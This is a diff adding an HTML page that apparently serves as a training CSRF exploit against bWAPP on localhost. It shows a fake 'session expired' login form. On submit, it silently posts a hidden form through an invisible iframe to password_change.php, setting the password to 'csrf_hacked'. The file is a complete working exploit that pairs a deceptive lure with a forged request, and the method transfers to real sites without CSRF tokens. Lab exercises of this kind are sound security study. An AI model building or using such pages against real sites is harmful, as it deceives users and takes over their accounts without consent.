@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>bWAPP — Login</title>
+  <style>
+    body { margin: 0; font-family: Arial, sans-serif; background: #f4f4f4; }
+    .bar { background: #556b2f; color: #fff; padding: 12px 20px; font-weight: bold; }
+    .wrap { max-width: 420px; margin: 48px auto; background: #fff; border: 1px solid #ccc; }
+    .head { background: #f60; color: #fff; padding: 14px 18px; }
+    .body { padding: 22px 18px; }
+    label { display: block; margin-top: 12px; font-size: 13px; }
+    input { width: 100%; margin-top: 6px; padding: 8px; box-sizing: border-box; border: 1px solid #aaa; }
+    button { margin-top: 18px; padding: 8px 18px; }
+    .msg { margin-top: 14px; font-size: 13px; color: #066; display: none; }
+    .hint { margin: 20px; font-size: 12px; color: #666; max-width: 520px; }
+  </style>
+</head>
+<body>
+  <div class="bar">bWAPP</div>
+  <div class="wrap">
+    <div class="head">Login — session expired</div>
+    <div class="body">
+      <p style="margin:0 0 8px;font-size:13px">Session expired. Sign in again.</p>
+      <form id="fake">
+        <label>Login</label>
+        <input type="text" value="bee" />
+        <label>Password</label>
+        <input type="password" />
+        <button type="submit">Login</button>
+      </form>
+      <p class="msg" id="ok"></p>
+    </div>
+  </div>
+  <p class="hint">
+    Учебная CSRF: войти в bWAPP на localhost, не выходить. Открыть эту страницу, Login —
+    в фоне POST на password_change.php (как в DevTools).
+  </p>
+
+  <iframe name="csrf-frame" style="display:none" title="csrf"></iframe>
+  <form id="csrf" target="csrf-frame" method="POST" style="display:none">
+    <input type="hidden" name="password_curr" value="bug" />
+    <input type="hidden" name="password_new" value="csrf_hacked" />
+    <input type="hidden" name="password_conf" value="csrf_hacked" />
+    <input type="hidden" name="action" value="change" />
+  </form>
+
+  <script>
+    document.getElementById("csrf").action = "http://localhost/password_change.php";
+    document.getElementById("fake").onsubmit = function (e) {
+      e.preventDefault();
+      document.getElementById("csrf").submit();
+      var ok = document.getElementById("ok");
+      ok.style.display = "block";
+      ok.textContent = "Готово. Проверьте вход с паролем csrf_hacked";
+    };
+  </script>
+</body>
+</html>
